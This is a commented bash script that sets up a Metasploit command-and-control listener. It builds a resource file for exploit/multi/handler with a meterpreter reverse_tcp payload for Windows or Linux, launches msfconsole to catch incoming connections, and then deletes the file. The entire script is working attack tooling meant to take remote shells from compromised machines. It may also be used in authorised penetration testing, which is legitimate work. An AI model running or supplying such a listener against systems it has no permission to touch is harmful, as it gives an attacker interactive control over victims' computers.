#!/bin/bash

# If we don't have 3 or 4 parameters warn the user and quit
if [ $# -ne 3 ] && [ $# -ne 4 ]
then
	echo "Usage: $0 <payload_sys_type> <payload_arch> [<listening_IP>] <listening_port>" 
	exit
fi

# Inform the user things are going okay!
echo "Launching Command & Control"

# If we were passed 3 parameters we'll automatically find the machines IP through
# the hostname command. Bear in mind this approach hasn't been thoroughly tested...
if [ $# -eq 3 ]
then
	IP=$(hostname -I)
	PORT=$3
# Otherwise just read the arguments
else
	IP=$3
	PORT=$4
fi

# Tell the user what we are configuring the C&C server as
echo "Working with IP:PORT -> ${IP}:${PORT}"

# Auxiliary variable to determine the payload's format
pyld_arch="/$2"

# Set the payload's architecture based on the platform we'll be connecting to
# or print an error message if a wrong one has been selected
if [ $1 == "windows" ]
then
	if [ $2 == "x86" ]
	then
		pyld_arch=""
	fi
elif [ ! $1 == "linux" ]
then
	echo -e "Wrong system type! Options:\n\twindows\n\tlinux"
	exit
fi

# Configure the architecture we'll be targeting
if [ $2 != "x86" ] && [ $2 != "x64" ]
then
	echo -e "Wrong architecture! Options:\n\tx86\n\tx64"
	exit
fi

# Populate a string with all the parameters we've set and pipe and save it to the c_c.rc file
echo -e "use exploit/multi/handler\nset PAYLOAD $1$pyld_arch/meterpreter/reverse_tcp\nset LHOST $IP\nset LPORT $PORT\nexploit" > c_c.rc

# Call msconsole and pass it the generated script. We'll now find ourselves in a live
# meterpreter session once the client connects back to us
msfconsole -r c_c.rc

# After the session is over tell the user and...
echo -e "\nDone!\nCleaning up..."

# ... clean the script we generated!
rm c_c.rc
